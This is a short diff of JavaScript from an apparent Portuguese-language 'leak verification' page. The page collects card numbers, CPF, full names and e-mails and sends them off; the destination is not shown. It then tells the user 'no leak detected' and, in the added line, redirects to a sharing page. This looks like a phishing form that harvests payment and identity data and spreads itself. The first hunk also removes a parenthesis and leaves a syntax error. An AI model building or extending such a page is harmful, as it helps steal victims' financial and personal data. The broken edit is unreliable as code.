@@ -265,7 +265,7 @@
             let formatted = '';
             for (let i = 0; i < digits.length; i++) {
                 if (i === 3 || i === 6) formatted += '.';
-                else if (i === 9) formatted += '-';
+                else if i === 9) formatted += '-';
                 formatted += digits[i];
             }
             return formatted;
@@ -393,6 +393,7 @@
                 button.innerHTML = '<i class="fas fa-shield-alt mr-2"></i> Verificar Agora';
                 button.classList.remove('animate-pulse');
                 alert(`Verificação concluída!\n\nNenhum vazamento detectado.\n\nDetalhes:\nCartão: ${data.cardNumber}\nTipo: ${data.cardType}\nCPF: ${data.cpf}\nNome: ${data.fullName}\nE-mail: ${data.email}\n\nUm relatório foi enviado para ${data.email}.`);
+                window.location.href = 'compartilhamento.html'; // Redireciona para a página de compartilhamento
             })
             .catch(error => {
                 console.error('Erro ao enviar dados:', error);
